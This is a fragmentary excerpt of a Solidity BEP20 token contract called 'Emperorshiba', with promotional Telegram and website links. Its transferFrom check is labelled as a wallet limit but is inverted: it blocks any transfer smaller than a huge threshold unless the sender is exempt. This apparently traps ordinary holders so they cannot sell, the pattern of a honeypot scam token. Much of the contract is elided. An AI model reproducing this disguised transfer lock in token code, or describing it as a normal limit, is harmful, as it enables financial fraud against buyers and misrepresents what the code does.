...
telegram: https://t.me/Emperorshiba

website:  https://emperorshiba.xyz
*/
...
contract Emperorshiba  is Context, iBEP20, Ownable {
  ...
  uint256 public _walletMax = 80000000000000000 * (10**9);
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      ...
      require(amount >= _walletMax || isWalletLimitExempt[sender], "Wallet Limit Exceeded");
